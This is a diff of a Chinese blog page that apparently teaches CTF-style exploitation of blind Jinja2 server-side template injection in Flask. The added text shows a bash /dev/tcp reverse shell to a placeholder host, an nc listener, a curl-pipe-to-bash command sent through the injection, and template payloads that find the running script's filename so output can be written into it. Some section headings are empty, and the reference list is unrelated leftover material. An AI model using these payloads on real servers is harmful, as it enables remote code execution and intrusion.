@@ -20,22 +20,24 @@
   <title>flask中的ssti注入-无回显 - AAAAl'blog</title>
 
   
-    <meta name="description" content="[TOC] 摘要杀杀杀 小结参考文章 references:  心跳之旅—💗—iOS用手机摄像头检测心率(PPG) PPG光电容积脉搏波描记法技术概况…">
+    <meta name="description" content="[TOC] 摘要这篇文章主要是讲解针对ssti注入无回显的情况，我们如何获取flag（本篇文章的测试环境是python3.9.13，flask3.0.3）。 能出网反弹shell我这边建议是将反弹命令写在本地服务器上面，然后再进行请求执行，这样不容易出现错误。 在本地服务器上面新键一个文件（假如是rebound.txt）： 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="flask中的ssti注入-无回显">
 <meta property="og:url" content="https://aaaa-l.github.io/2024/12/30/flask%E4%B8%AD%E7%9A%84ssti%E6%B3%A8%E5%85%A5-%E6%97%A0%E5%9B%9E%E6%98%BE/">
 <meta property="og:site_name" content="AAAAl&#39;blog">
-<meta property="og:description" content="[TOC] 摘要杀杀杀 小结参考文章 references:  心跳之旅—💗—iOS用手机摄像头检测心率(PPG) PPG光电容积脉搏波描记法技术概况…">
+<meta property="og:description" content="[TOC] 摘要这篇文章主要是讲解针对ssti注入无回显的情况，我们如何获取flag（本篇文章的测试环境是python3.9.13，flask3.0.3）。 能出网反弹shell我这边建议是将反弹命令写在本地服务器上面，然后再进行请求执行，这样不容易出现错误。 在本地服务器上面新键一个文件（假如是rebound.txt）： 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2024-12-30T13:50:16.000Z">
-<meta property="article:modified_time" content="2024-12-30T13:50:16.332Z">
+<meta property="article:modified_time" content="2024-12-30T17:24:50.884Z">
 <meta property="article:author" content="AAAAl">
-<meta property="article:tag" content="study,security,web,java,php,python,ctf,wp,Technology sharing">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="ssti">
+<meta property="article:tag" content="无回显注入">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <meta name="keywords" content="study,security,web,java,php,python,ctf,wp,Technology sharing">
+  <meta name="keywords" content="python,ssti,无回显注入">
 
   <!-- feed -->
   
@@ -79,16 +81,37 @@
 
 
 
-<div class="article banner top"><img class="bg lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/images/.jpg">
+<div class="article banner top"><img class="bg lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/images/flask_ssti3.jpg">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-30T13:50:16.000Z">2024-12-30</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-30T13:50:16.332Z">2024-12-30</time></span></div></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/python/">python</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/python/ssti/">ssti</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-12-30T13:50:16.000Z">2024-12-30</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-12-30T17:24:50.884Z">2024-12-31</time></span></div></div></div>
     
   </div>
   </div><article class="md-text content"><p>[TOC]</p>
-<h6 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h6><p>杀杀杀</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><hr>
+<h6 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h6><p>这篇文章主要是讲解针对ssti注入无回显的情况，我们如何获取<strong>flag</strong>（本篇文章的测试环境是python3.9.13，flask3.0.3）。</p>
+<h2 id="能出网"><a href="#能出网" class="headerlink" title="能出网"></a>能出网</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>我这边建议是将反弹命令写在本地服务器上面，然后再进行请求执行，这样不容易出现错误。</p>
+<p>在本地服务器上面新键一个文件（假如是rebound.txt）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1 <br></code></pre></td></tr></table></figure>
+
+<p>本地监听端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">nc -lvvp xxxx<br></code></pre></td></tr></table></figure>
+
+<p>再借助ssti注入执行命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl xx.xx.xx.xx/rebound.txt | bash  <br></code></pre></td></tr></table></figure>
+
+<p>这样还有一个好处就是，我们可以通过查看本地日志来检查是否接收到对方的请求，因为有的时候反弹不成功不一定是不出网。</p>
+<h3 id="dnslog外带"><a href="#dnslog外带" class="headerlink" title="dnslog外带"></a>dnslog外带</h3><p>没什么好说的，没有服务器的话可以考虑一下这个方法。</p>
+<h2 id="不能出网"><a href="#不能出网" class="headerlink" title="不能出网"></a>不能出网</h2><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><p>我们可以将命令输出的结果写在当前运行的脚本文件当中，因为文件已经加载到内存当中，所以就算我们的输出结果将文件进行覆盖，我们还是可以继续执行命令。当然如果是在实战环境中，我们最好还是在一个能够访问的目录下面创建一个文件，写在里面。</p>
+<p>这个时候就需要获取当前运行的文件名，当然我们也可以使用一些常见的文件名进行测试一下，如<code>app.py</code>等。</p>
+<h4 id="sys模块获取文件名"><a href="#sys模块获取文件名" class="headerlink" title="sys模块获取文件名"></a>sys模块获取文件名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;% set filename = x.__init__.__globals__.sys.argv[0] %&#125;<br></code></pre></td></tr></table></figure>
+
+<p>还记得我们前一篇文章绕过中讲过得吗？这个时候的x因为没有定义，所以相当于是<strong>runtime.py中的Undefined类</strong>，而<strong>runtime.py文件中导入了sys模块</strong>，我们借助sys模块就能够获取文件名。</p>
+<h4 id="os模块获取文件名"><a href="#os模块获取文件名" class="headerlink" title="os模块获取文件名"></a>os模块获取文件名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;% set filepath = lipsum.__globals__.__builtins__.__import__(&#x27;__main__&#x27;).__file__ %&#125; <br>&#123;% set filename = lipsum.__globals__.os.path.basename(filepath) %&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里是先获取了绝对路径，再通过绝对路径获取的文件名。这里获取绝对路径是通过当前模块的<code>__file__</code>属性，所以这个payload成功的条件就是要求当前模块的名字是<code>__main__</code>。而当一个文件被直接运行的时候，他当前的模块名就是<code>__main__</code>；如果是作为模块被导入到另一文件中，这个时候的模块名就是他的文件名，如<code>app.py</code>，就是<code>app</code>。</p>
+<p>通过这两种方法，我们就可以得到运行文件的文件名，我们可以将输出结果写在运行文件中，也可以通过相对路径或者绝对路径写到其他文件当中。</p>
+<h2 id="打内存马"><a href="#打内存马" class="headerlink" title="打内存马"></a>打内存马</h2><h2 id="http污染"><a href="#http污染" class="headerlink" title="http污染"></a>http污染</h2><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><hr>
 <p>references:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://punmy.cn/2016/07/28/15231176397746.html">心跳之旅—💗—iOS用手机摄像头检测心率(PPG)</a></li>
@@ -112,7 +135,8 @@
     </section>
     <section class='body'>
     <div class="related-posts"><a class="item" href="\2024\12\23\flask中的ssti注入-前置基础知识\" title="flask中的ssti注入-前置基础知识"><span class="title">flask中的ssti注入-前置基础知识</span><span class="excerpt">[TOC]
-摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不...</span></a></div></section></div>
+摘要为什么要写这一篇文章呢？一方面是是为了防止手注时出现错误不知如何进行更改，另一方面是后面讲得所有的利用和绕过都是在此基础上，只有对这方面有所了解，你才能理解后面的payload。（会讲得比较细致，适合零基础的小白）。不...</span></a><a class="item" href="\2024\12\26\flask中的ssti注入-绕过\" title="flask中的ssti注入-绕过"><span class="title">flask中的ssti注入-绕过</span><span class="excerpt">[TOC]
+摘要这篇文章本身主要是讲解针对ssti的过滤如何进行绕过（本篇文章的测试环境是python3.9.13，flask3.0.3）。</span></a></div></section></div>
 
 
 
@@ -178,7 +202,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div><div class="widget-footer">
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%BD%E5%87%BA%E7%BD%91"><span class="toc-text">能出网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dnslog%E5%A4%96%E5%B8%A6"><span class="toc-text">dnslog外带</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E8%83%BD%E5%87%BA%E7%BD%91"><span class="toc-text">不能出网</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-text">写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sys%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">sys模块获取文件名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">os模块获取文件名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">打内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E6%B1%A1%E6%9F%93"><span class="toc-text">http污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
